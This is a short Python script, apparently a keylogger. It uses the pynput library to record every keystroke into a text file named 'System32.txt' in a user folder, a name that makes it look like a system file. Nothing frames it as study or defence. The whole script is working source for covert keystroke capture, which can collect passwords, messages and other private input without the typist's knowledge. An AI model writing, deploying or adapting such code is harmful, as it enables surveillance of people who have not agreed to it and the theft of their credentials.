import os
from pynput.keyboard import Key, Listener

file_path = "C:\\Users\\kiril\\System32.txt"


def on_key_press(key):
    with open(file_path, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key in [Key.space]:
                with open(file_path, "a") as text_file:
                    text_file.write(" ")
            else:
                pass


# Ensure the directory structure exists
os.makedirs(os.path.dirname(file_path), exist_ok=True)

# Set up a keyboard listener
with Listener(on_press=on_key_press) as listener:
    listener.join()

